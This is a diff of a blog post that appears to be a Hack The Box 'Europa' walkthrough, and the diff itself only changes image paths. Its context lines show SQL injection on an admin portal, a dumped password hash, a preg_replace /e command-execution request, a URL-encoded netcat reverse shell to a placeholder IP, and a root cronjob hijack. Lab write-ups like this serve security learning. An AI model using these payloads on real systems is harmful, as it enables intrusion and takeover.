@@ -72,15 +72,15 @@ Nmap done: 1 IP address (1 host up) scanned in 77.84 seconds
 ## Port 80 and 443
 Both return a default apache2 webpage which doesn't give us much to go on.
 
-<img src="/img/blog/htb-europa/htb-europa-01.png">
+<img src="/assets/img/blog/htb-europa/htb-europa-01.png">
 
 Bruteforcing directories didn't give any results and neither did a nikto scan. Well, what can one do at this point? If you look closely at the nmap scan from before, you will notice that port 443 has an alternative DNS name of `DNS:admin-portal.europacorp.htb` which we can use to edit `/etc/hosts/` file and possibly gain access to another webpage by resolving DNS queries. Do this with `gedit /etc/hosts/` and add `10.10.10.22 admin-portal.europacorp.htb`.
 
 End result:
-<img src="/img/blog/htb-europa/htb-europa-02.png">
+<img src="/assets/img/blog/htb-europa/htb-europa-02.png">
 
 Now access the webpage again using *https://admin-portal.europacorp.htb*:
-<img src="/img/blog/htb-europa/htb-europa-03.png">
+<img src="/assets/img/blog/htb-europa/htb-europa-03.png">
 
 We are prompted to login into EuropaCorp's beta Server (Vulnerable to SQL injection)!  
 
@@ -88,7 +88,7 @@ We are prompted to login into EuropaCorp's beta Server (Vulnerable to SQL inject
 
 ## Manual SQL injection
 Manual injection was a lengthy process of trial and error, crying into my pillow and frustration. Start off by making a legit HTTP POST request and capturing it via burp proxy (DON'T FORWARD IT YET). 
-<img src="/img/blog/htb-europa/htb-europa-04.png">
+<img src="/assets/img/blog/htb-europa/htb-europa-04.png">
 
 Afterwards send it to burp repeater by clicking **Action >> Send to Repeater** or by pressing  `CTRL+R`. In there you can start tinkering with SQL commands and various injection methods you think may work or might give good results. One which worked for me is right below. 
 
@@ -100,10 +100,10 @@ To compromise the application:
 * Follow the redirect
 * Forward the post request in the proxy tab
 
-<img src="/img/blog/htb-europa/htb-europa-05.png">
+<img src="/assets/img/blog/htb-europa/htb-europa-05.png">
 
 If everything is done correctly you will see a 302 redirect response which will grant us an authenticated cookie. This allows us to refresh the login page in our browser or forward the previous captured request right into the admin dashboard! 
-<img src="/img/blog/htb-europa/htb-europa-06.png">
+<img src="/assets/img/blog/htb-europa/htb-europa-06.png">
 
 
 ## SQLmap
@@ -159,7 +159,7 @@ Eventually, SQLmap will obtain password hashes for you which can then be [cracke
 | 2  | john@europacorp.htb  | 1      | john          | 2b6d315337f18617ba18922c0b9597ff |
 +----+----------------------+--------+---------------+----------------------------------+
 ```
-<img src="/img/blog/htb-europa/htb-europa-07.png">
+<img src="/assets/img/blog/htb-europa/htb-europa-07.png">
 
 
 Now just use the credentials to login! 
@@ -169,7 +169,7 @@ Now just use the credentials to login!
 # Exploitation
 
 Upon successfully authenticating, click on **Tools** tab on the left of the admin dashboard which puts us here:
-<img src="/img/blog/htb-europa/htb-europa-08.png">
+<img src="/assets/img/blog/htb-europa/htb-europa-08.png">
 
 Experimenting with the functionality of the VPNGenerator, it is easy to spot what it does. A placeholder string in the VPN generator window is substituted for a custom input via `preg_replace()` php function. Older implementations of `preg_replace()` are vulnerable to a remote command execution using `\e` specifier if you know how to approach it! I suggest doing your own research on the function if you are unfamiliar with php. Here are some links to help you: 
 
@@ -179,17 +179,17 @@ Experimenting with the functionality of the VPNGenerator, it is easy to spot wha
 
 As before, open up burp, make a legit generation request and intercept it.
 
-<img src="/img/blog/htb-europa/htb-europa-09.png"> 
+<img src="/assets/img/blog/htb-europa/htb-europa-09.png"> 
 
 Feel free to edit out all the giberrish and change the request data to `pattern=%2Fv3ded%2Fe&ipaddress=system("ls -la /")&text=v3ded` so that we can achieve RCE.
   
-<img src="/img/blog/htb-europa/htb-europa-10.png">
+<img src="/assets/img/blog/htb-europa/htb-europa-10.png">
 
 Now it's just the matter changing the system() command parameters and getting a [reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). You can approach it in many ways, here is my solution - `system("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+yourIP+PORT+>/tmp/f")`!  We use netcat for a reverse shell connection, however because *-e* option is  unavailable, we are forced to use a workaround. Check the reverse shell link above for more information.
 
 > Note: The previous reverse shell is an URL encoded version of the original one, found on pentestmonkey!
 
-<img src="/img/blog/htb-europa/htb-europa-11.png">
+<img src="/assets/img/blog/htb-europa/htb-europa-11.png">
 
 Baaam!
 
@@ -238,7 +238,7 @@ Clearlogs script clears access.log and **executes** `/var/www/cmd/logcleared.sh`
 
 Once the cronjob calls `/var/www/cronjobs/clearlogs` our malicious logcleared.sh file will be executed which will give us a root shell!
 
-<img src="/img/blog/htb-europa/htb-europa-12.png">
+<img src="/assets/img/blog/htb-europa/htb-europa-12.png">
 
 ***
 
